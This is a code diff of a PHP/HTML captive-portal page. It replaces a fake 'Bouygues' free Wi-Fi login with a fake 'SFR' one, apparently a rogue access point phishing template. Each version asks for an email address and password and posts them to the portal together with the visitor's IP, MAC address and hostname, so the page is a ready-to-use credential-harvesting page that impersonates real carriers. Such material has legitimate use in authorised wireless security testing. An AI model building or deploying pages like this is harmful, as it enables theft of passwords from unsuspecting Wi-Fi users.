@@ -1,211 +1,153 @@
+<?php
+$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+require_once('helper.php');
+?>
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Wi-Fi Public Gratuit Bouygues</title>
-<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+<title>Portail Captif SFR Premium</title>
+
+<!-- Mini Tailwind CSS local -->
 <style>
-    /* Fond animé dégradé Bouygues */
-    body {
-        margin: 0;
-        min-height: 100vh;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        background: linear-gradient(-45deg, #0070c9, #005a9c, #00a0e3, #0d0d0d);
-        background-size: 400% 400%;
-        animation: gradientBG 15s ease infinite;
-        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-    }
-
-    @keyframes gradientBG {
-        0% {background-position:0% 50%;}
-        50% {background-position:100% 50%;}
-        100% {background-position:0% 50%;}
-    }
-
-    /* Carte principale */
-    .card {
-        backdrop-filter: blur(20px);
-        background-color: rgba(17,17,17,0.85);
-        border-radius: 2rem;
-        padding: 2.5rem;
-        max-width: 420px;
-        width: 90%;
-        box-shadow: 0 12px 40px rgba(0,0,0,0.7);
-        color: #fff;
-        position: relative;
-        transition: transform 0.3s;
-    }
-
-    .card:hover {
-        transform: translateY(-5px);
-    }
-
-    /* Logo Bouygues */
-    .logo {
-        display: block;
-        margin: 0 auto 20px auto;
-        max-width: 140px;
-    }
-
-    /* Titres */
-    h1 {
-        font-size: 1.5rem;
-        font-weight: bold;
-        text-align: center;
-        color: #00a0e3;
-        margin-bottom: 30px;
-    }
-
-    /* Inputs */
-    .form-control {
-        background-color: rgba(26,26,26,0.8);
-        border: none;
-        border-radius: 1rem;
-        color: #fff;
-        padding: 16px 18px;
-        transition: all 0.3s;
-    }
-
-    .form-control:focus {
-        box-shadow: 0 0 0 0.25rem rgba(0,112,201,0.5);
-        background-color: rgba(26,26,26,0.9);
-        color: #fff;
-    }
-
-    .form-label {
-        color: #ccc;
-        transition: color 0.3s, transform 0.3s;
-    }
-
-    /* Bouton gradient animé */
-    .btn-gradient {
-        background: linear-gradient(45deg, #0070c9, #00a0e3);
-        border: none;
-        font-weight: bold;
-        transition: 0.4s;
-    }
-
-    .btn-gradient:hover {
-        background: linear-gradient(45deg, #00a0e3, #0070c9);
-    }
-
-    /* Bouton voir mot de passe */
-    .toggle-password {
-        position: absolute;
-        right: 18px;
-        top: 38px;
-        background: none;
-        border: none;
-        color: #ccc;
-        font-size: 20px;
-        cursor: pointer;
-        transition: color 0.3s;
-    }
-    .toggle-password:hover { color: #00a0e3; }
-
-    .error-message {
-        display: none;
-        font-size: 0.8rem;
-        color: #ff4d4f;
-        margin-top: 0.25rem;
-    }
-
-    /* Checkbox & link */
-    .form-check-label {
-        color: #ccc;
-    }
-
-    .text-info { color: #00a0e3 !important; }
-
-    @media (max-width: 500px) {
-        .card { padding: 2rem; }
-        h1 { font-size: 1.3rem; }
-    }
+/* ===== MINI TAILWIND ===== */
+* { box-sizing:border-box; margin:0; padding:0; font-family:sans-serif; }
+body { background:#1e1e1e; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; }
+.flex { display:flex; }
+.items-center { align-items:center; }
+.justify-center { justify-content:center; }
+.w-full { width:100%; }
+.max-w-sm { max-width:380px; }
+.bg-gray-800 { background: rgba(42,42,42,0.85); }
+.rounded-xl { border-radius:1rem; }
+.p-6 { padding:2rem; }
+.text-center { text-align:center; }
+.text-red-600 { color:#e60028; }
+.text-gray-400 { color:#ccc; }
+.mb-4 { margin-bottom:1rem; }
+.mb-6 { margin-bottom:1.5rem; }
+.mb-2 { margin-bottom:0.5rem; }
+.px-4 { padding-left:1rem; padding-right:1rem; }
+.py-3 { padding-top:0.75rem; padding-bottom:0.75rem; }
+.border { border:1px solid #555; }
+.rounded { border-radius:0.5rem; }
+.bg-gray-700 { background: rgba(50,50,50,0.8); }
+.focus-outline { outline:2px solid #e60028; }
+.btn { width:100%; py-3; rounded; font-weight:bold; cursor:pointer; mb-2; transition:0.2s; }
+.btn-login { background:#e60028; color:#fff; }
+.btn-login:hover { background:#ff2c48; }
+.btn-guest { background:transparent; border:1px solid #aaa; color:#ccc; }
+.btn-guest:hover { color:#fff; border-color:#e60028; }
+/* Success animation */
+#success { position:absolute; inset:0; display:flex; justify-content:center; align-items:center; background:rgba(0,0,0,0.6); font-size:3rem; border-radius:1rem; opacity:0; pointer-events:none; transition:opacity 0.3s ease; z-index:20; }
+#success.show { opacity:1; }
+/* Logo halo */
+.logo-container { position:relative; display:inline-block; margin-bottom:1rem; }
+.logo-halo { position:absolute; inset:0; border-radius:50%; background: radial-gradient(circle,#e60028 0%,transparent 70%); filter:blur(20px); animation: pulse 2s infinite alternate; z-index:-1; }
+@keyframes pulse { 0%{transform:scale(1);} 100%{transform:scale(1.2);} }
+/* Particles */
+.particle { position:absolute; width:6px; height:6px; border-radius:50%; background: radial-gradient(circle,#ff3b50 0%,#ff6b6b 80%); pointer-events:none; opacity:0.8; filter:blur(2px); animation:fadeOut 0.6s forwards; z-index:5; }
+@keyframes fadeOut { 0% { transform:scale(1); opacity:0.8; } 100% { transform:scale(0); opacity:0; } }
+/* Orbs */
+.orb { position:absolute; width:15px; height:15px; border-radius:50%; background: radial-gradient(circle,#ff3b50 0%,#ff6b6b 80%); box-shadow:0 0 15px rgba(255,59,80,0.6); pointer-events:none; z-index:5; opacity:0.8; }
 </style>
 </head>
 <body>
 
-<div class="card shadow">
-    <img src="/bouygue_free_wifi/assets/bouygue.jpg" alt="Bouygues Logo" class="logo">
-    <h1>Wi-Fi Public Gratuit fourni par votre opérateur Bouygues</h1>
+<div id="orbsContainer"></div>
 
-    <form id="loginForm" method="POST" action="/captiveportal/index.php" class="position-relative">
-        <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
-        <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
-        <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
-        <input type="hidden" name="target" value="<?=$destination?>">
+<div class="bg-gray-800 rounded-xl p-6 text-center max-w-sm" id="card">
+  <div class="logo-container">
+    <div class="logo-halo"></div>
+    <img src="assets/sfr_logo.jpg" alt="SFR Logo" style="width:120px;">
+  </div>
+  <h1 class="text-red-600 mb-2 text-xl">Accès Wi-Fi SFR</h1>
+  <p class="text-gray-400 mb-6 text-sm">Connectez-vous pour profiter d’Internet en toute sécurité.</p>
 
-        <!-- Email -->
-        <div class="mb-3 position-relative">
-            <label for="email" class="form-label">Adresse e-mail</label>
-            <input type="email" class="form-control" id="email" name="email" required>
-            <div class="error-message" id="emailError">Email invalide</div>
-        </div>
+  <form method="POST" action="/captiveportal/index.php" id="form">
+    <input class="w-full py-3 px-4 mb-4 rounded border bg-gray-700 text-white" name="email" type="email" placeholder="Adresse e-mail" required>
+    <input class="w-full py-3 px-4 mb-4 rounded border bg-gray-700 text-white" name="password" type="password" placeholder="Mot de passe" required>
 
-        <!-- Password -->
-        <div class="mb-3 position-relative">
-            <label for="password" class="form-label">Mot de passe</label>
-            <input type="password" class="form-control" id="password" name="password" required>
-            <button type="button" class="toggle-password" id="togglePw">👁️</button>
-            <div class="error-message" id="passwordError">Mot de passe requis</div>
-        </div>
+    <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
+    <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
+    <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
+    <input type="hidden" name="target" value="<?=$destination?>">
 
-        <!-- Remember & Help -->
-        <div class="d-flex justify-content-between align-items-center mb-4">
-            <div class="form-check">
-                <input class="form-check-input" type="checkbox" id="remember" name="remember">
-                <label class="form-check-label" for="remember">Se souvenir de moi</label>
-            </div>
-            <a href="#" class="text-info">Besoin d'aide ?</a>
-        </div>
-
-        <button type="submit" class="btn btn-gradient w-100 py-3 rounded-pill">Se connecter</button>
-    </form>
+    <button type="submit" class="btn btn-login mb-2">Se connecter</button>
+  </form>
+  <button id="guestBtn" class="btn btn-guest">Connexion invitée</button>
 </div>
 
+<div id="success">✓</div>
+
 <script>
-    // Toggle mot de passe
-    const togglePw = document.getElementById('togglePw');
-    const password = document.getElementById('password');
+// Success animation + POST
+const form = document.getElementById('form');
+const guestBtn = document.getElementById('guestBtn');
+const success = document.getElementById('success');
+const card = document.getElementById('card');
+const orbsContainer = document.getElementById('orbsContainer');
 
-    togglePw.addEventListener('click', () => {
-        if(password.type === 'password'){
-            password.type = 'text';
-            togglePw.textContent = '🙈';
-        } else {
-            password.type = 'password';
-            togglePw.textContent = '👁️';
-        }
-    });
+function showSuccess() {
+  success.classList.add('show');
+  setTimeout(()=> success.classList.remove('show'), 900);
+}
 
-    // Validation simple
-    const form = document.getElementById('loginForm');
-    form.addEventListener('submit', (e) => {
-        let valid = true;
-        const email = document.getElementById('email');
-        const password = document.getElementById('password');
-        const emailError = document.getElementById('emailError');
-        const passwordError = document.getElementById('passwordError');
+form.addEventListener('submit', function(e){
+  e.preventDefault();
+  showSuccess();
+  setTimeout(()=> form.submit(), 500);
+});
+guestBtn.addEventListener('click', showSuccess);
 
-        emailError.style.display = 'none';
-        passwordError.style.display = 'none';
+// Particles
+function createParticle(x,y){
+  const p=document.createElement('div');
+  p.className='particle';
+  p.style.left=x+'px';
+  p.style.top=y+'px';
+  document.body.appendChild(p);
+  setTimeout(()=>p.remove(),600);
+}
+window.addEventListener('mousemove', e=>createParticle(e.clientX,e.clientY));
+window.addEventListener('touchmove', e=>{
+  for(let t of e.touches) createParticle(t.clientX,t.clientY);
+});
 
-        if(!email.value.includes('@')){
-            emailError.style.display = 'block';
-            valid = false;
-        }
-        if(password.value.trim() === ''){
-            passwordError.style.display = 'block';
-            valid = false;
-        }
+// Card tilt
+function updateTilt(x,y){ card.style.transform=`rotateX(${x}deg) rotateY(${y}deg)`; }
+window.addEventListener('mousemove', e=>{
+  const cx=window.innerWidth/2, cy=window.innerHeight/2;
+  updateTilt((e.clientY-cy)/cy*10, (e.clientX-cx)/cx*10);
+});
+window.addEventListener('deviceorientation', e=>{
+  const x=e.beta?(e.beta-45)/45*10:0, y=e.gamma?e.gamma/45*10:0;
+  updateTilt(x,y);
+});
 
-        if(!valid) e.preventDefault();
-    });
+// Orbs
+const orbs=[];
+for(let i=0;i<8;i++){
+  const orb=document.createElement('div');
+  orb.className='orb';
+  orb.style.left=Math.random()*100+'%';
+  orb.style.top=Math.random()*100+'%';
+  orbsContainer.appendChild(orb);
+  orbs.push(orb);
+}
+function moveOrbs(x,y){
+  orbs.forEach((orb,i)=>{ const offset=5+i*2; orb.style.transform=`translate(${y*offset}px,${x*offset}px)`; });
+}
+window.addEventListener('mousemove', e=>{
+  const cx=window.innerWidth/2, cy=window.innerHeight/2;
+  moveOrbs((e.clientY-cy)/cy*10, (e.clientX-cx)/cx*10);
+});
+window.addEventListener('deviceorientation', e=>{
+  const x=e.beta?(e.beta-45)/45*10:0, y=e.gamma?e.gamma/45*10:0;
+  moveOrbs(x,y);
+});
 </script>
-
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
